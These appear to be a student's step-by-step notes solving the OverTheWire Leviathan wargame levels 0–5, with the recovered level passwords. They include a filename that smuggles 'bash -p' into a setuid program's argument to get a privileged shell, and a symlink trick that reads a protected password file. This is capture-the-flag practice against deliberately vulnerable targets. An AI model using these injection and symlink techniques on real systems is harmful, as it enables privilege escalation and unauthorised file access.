@@ -1,0 +1,85 @@
+ssh -p 2223 leviathan0leviathan.labs.onthewire.org (shortened to only changes going forward)
+ls -lah (shortened to just ls going forward)
+cd .backup
+ls
+cat bookmarks.html | grep leviathan1
+
+passwod for 1
+PPIfmI1qsA
+
+exit
+ssh ... leviathan1 ...
+ls
+./check
+ltrace ./check
+butts
+it shows the password being compared to butts
+./check
+sex
+whoami
+cat /etc/leviathan_pass/leviathan2
+
+password for 2
+mEh5PNl10e
+
+exit
+ssh ... 2 ...
+ls
+./printfile
+it asks for a file, feeding it the password file for the next level gets a refusal
+ltrace ./printfile /etc/leviathan_pass/leviathan3
+ltrace ./printfile .profile
+it checks for file access, and afterwords it does a setuid operation, I believe a bad file name like we were shown in class would work here
+I did butloads of googling here on bad/dangerous file names, and found that 'bash -p' maintains permissions from setuid operations, perfect
+mktemp -d /tmp/rabid.XXX
+cd /tmp/rabid.nTL
+touch "butts;bash -p"
+/home/leviathan2/printfile "butts;bash -p"
+gave me a bash shell as leviathan3 as expected
+cat /etc/leviathan_pass/leviathan3
+
+password for 3
+Q0G8j4sakn
+
+exit
+ssh ... 3 ...
+ls
+./level3
+ltrace ./level3
+kakaka
+its comparing to snlprintf
+./level3
+snlprintf
+whoami
+cat /etc/leviathan_pass/leviathan4
+
+password for 4
+AgvropI4OA
+
+exit
+ssh ... 4 ...
+ls
+cd .trash
+ls
+./bin
+it gives binary, I am betting its the password, google converter
+
+password for 5
+EKKlTF1Xqs
+
+exit
+ssh ... 5 ...
+ls
+./leviathan5
+got an error about a file log
+ltrace ./leviathan5
+man fopen
+mktemp /tmp/file.log.XXX
+mv /tmp/file.log.IQN /tmp/file.log
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+rm /tmp/file.log
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+
+password for 6
+YZ55XPVk2l
+
